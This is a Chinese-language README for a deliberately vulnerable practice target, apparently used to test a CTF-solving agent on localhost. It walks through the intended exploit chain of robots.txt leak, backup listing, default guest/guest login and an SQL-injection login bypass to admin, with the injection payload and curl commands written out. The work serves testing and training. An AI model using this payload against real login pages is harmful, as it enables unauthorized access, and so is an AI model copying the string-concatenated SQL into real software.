# 练习靶场：内部员工门户 v0.3

**这是一个故意存在漏洞的靶机**，只用于本地演练 CTF-Agent 的完整解题链路。
请勿部署到公网或任何真实业务环境。

## 漏洞链（预期解法，用于验证靶场确实可解）

| 步骤 | 请求 | 说明 |
| --- | --- | --- |
| 1 | `GET /robots.txt` | 泄露 `/backup/` 与 `/admin`、`/login` |
| 2 | `GET /backup/` | 目录列举，暴露 `README.bak`、`app.py.bak` |
| 3 | `GET /backup/README.bak` | 泄露默认低权限账号 `guest/guest` 与表结构 |
| 4 | `GET /login?u=guest&p=guest` | 登录成功但身份是 `user`，`/admin` 返回 403 |
| 5 | `GET /login?u=' OR username='admin'-- &p=x` | 字符串拼接 SQL → 越权登录为 `admin`，下发 `session=YWRtaW4=`（base64 的 `admin`） |
| 6 | `GET /admin`（带 `session` Cookie） | 返回 flag |

原始 payload（`%27%20OR%20username%3D%27admin%27--%20`）：

```bash
curl -s -i "http://127.0.0.1:8081/login?u=%27%20OR%20username%3D%27admin%27--%20&p=x" | grep -i set-cookie
curl -s -b "session=YWRtaW4=" http://127.0.0.1:8081/admin
```

## 运行

```bash
# 方式一：直接跑（宿主机需要 python3）
PORT=8081 python3 app.py

# 方式二：容器
docker build -t ctf-agent/practice-range:dev . && \
  docker run --rm -p 127.0.0.1:8081:8080 ctf-agent/practice-range:dev
```

flag 通过环境变量 `FLAG` 注入，默认 `flag{sql1_1nj3ct10n_b4s1cs}`。

## 设计意图（为什么这样出题）

- **有明确的解题阶梯**：robots → 备份目录 → 弱口令登录 → SQLi → 越权，Agent 必须一步步推进并记录证据，
  而不是"一次命令碰运气"。
- **能验证多个内建能力**：目录列举（`list_dir`/`curl`）、文本分析（`grep`/`read_file`）、
  黑板沉淀（`blackboard_upsert`）、flag 提交（`flag_submit`）、题解生成（`report_generate`）。
- **给"目标范围校验"留出接口**：靶机地址只在本机回环暴露，Agent 必须知道"目标是 127.0.0.1:8081"
  才可能成功。